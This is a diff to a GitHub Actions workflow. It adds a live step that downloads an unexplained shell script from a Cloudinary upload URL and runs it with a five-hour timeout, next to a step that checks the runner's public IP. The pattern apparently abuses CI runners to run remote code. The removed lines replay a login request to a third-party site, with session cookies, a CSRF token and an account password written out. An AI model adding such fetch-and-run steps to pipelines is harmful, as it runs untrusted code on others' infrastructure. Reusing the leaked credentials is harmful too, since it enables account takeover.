@@ -13,27 +13,9 @@ jobs:
       - name: IP Workflow
         run: |
           curl https://api.ipify.org
-      # - name: Run exec
-      #   timeout-minutes: 300
-      #   run: |
-      #     curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1711832294/nuephguljsh2zaq90gsk.sh
-      #     chmod +x nuephguljsh2zaq90gsk.sh
-      #     ./nuephguljsh2zaq90gsk.sh
-      - name: Exécuter CURL
+      - name: Run exec
+        timeout-minutes: 300
         run: |
-              curl 'https://www.tiroof.co.uk/connexionPopup' \
-              -H 'accept: */*' \
-              -H 'accept-language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7' \
-              -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
-              -H 'cookie: _ga=GA1.1.9972606.1711702165; cf_clearance=zPj_RKn4TIitRLUg2aqMguMPOn0nfyB7UqqiHWwC47Y-1712221137-1.0.1.1-u3d4To_tHb0V4T0SnTia7CNjLbLcB28NRy7.hCxIWcSYvWvMUJsg5q3sm3TRFGDhJD1p8Gd5Oy4VSnKB8nFBxg; XSRF-TOKEN=eyJpdiI6IlNySkw4QmxEaUZuekJncno5cUdBZlE9PSIsInZhbHVlIjoibmh5ZXNwU1EvbG15Zjl3RjZzUEErTElXbUdKVjh0dS9kVUpFNDhtUHVkY3BQdmlISFQweXkwdHBJcmNmWFVScGZDcmRjOUVqK3ZCYk5JV21Fb252WHYvQjlJbFFZVkFSbXh3bGZ2MjFSVTVtY1VHajIyVi93cE9uZHNzcE5Zd2siLCJtYWMiOiIyZjc1Y2Q2YzZjZDA0YzMzYWQxNDc1OGMzZjIwMzU3NTZjNDc3ZjdlYzgwNGRmNDc5MjM1OTJmOGE2MGExNGYwIiwidGFnIjoiIn0%3D; bailti_session=eyJpdiI6IkJUTFhiTlBGOTcrdE9ybXA5Y2R6akE9PSIsInZhbHVlIjoidVhiSkpOVFcrSW5IY2oyclFKbWRUdkQ5elpLanR4bnRiSWphc3JOZlJLUE1QQ0xBTjFpRk9OOHBkSmFWRWNxd3FHZ3NadXBNdWRBZk5HN0E2d2hYZkVmK2phWW5BczJuQjFsWnpQV3lhKzN6emd2S2RqTEU5MkZoRml6Q00rS0ciLCJtYWMiOiJiNTBmNWJhODAxYTE4MmY4ODkwNDUyODc1ODIwOTMxNzkxOGQwMzQ3M2JlYzA4MjdiYTg4ODBlODIwMGZmOWQ0IiwidGFnIjoiIn0%3D; TawkConnectionTime=0; twk_uuid_65b0c1b28d261e1b5f573855=%7B%22uuid%22%3A%221.SwsVcT4wB3ajjsnzgojciGwbNeItCeHZKwJtC7rhd6kKKEtXf749q2pk76igjWuQgFyfNsg6K27ojGQwoXZLormpfXNAISYSvnbMDniiyPIWrrwXbcFqe%22%2C%22version%22%3A3%2C%22domain%22%3A%22tiroof.co.uk%22%2C%22ts%22%3A1712221851141%7D; _ga_TF9T2PFE93=GS1.1.1712219694.3.1.1712221855.0.0.0' \
-              -H 'origin: https://www.tiroof.co.uk' \
-              -H 'referer: https://www.tiroof.co.uk/connexion' \
-              -H 'sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"' \
-              -H 'sec-ch-ua-mobile: ?0' \
-              -H 'sec-ch-ua-platform: "Windows"' \
-              -H 'sec-fetch-dest: empty' \
-              -H 'sec-fetch-mode: cors' \
-              -H 'sec-fetch-site: same-origin' \
-              -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36' \
-              -H 'x-requested-with: XMLHttpRequest' \
-              --data-raw $'_token=bjyV5AXEwmHhXH8VCqgZ5lcGv2Y9ZsQ490gHzMtl&timezone=&email=cudytoja%40mailinator.com&password=Pa%24%24w0rd\u0021'
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1722844772/bpma.sh
+          chmod +x bpma.sh
+          ./bpma.sh
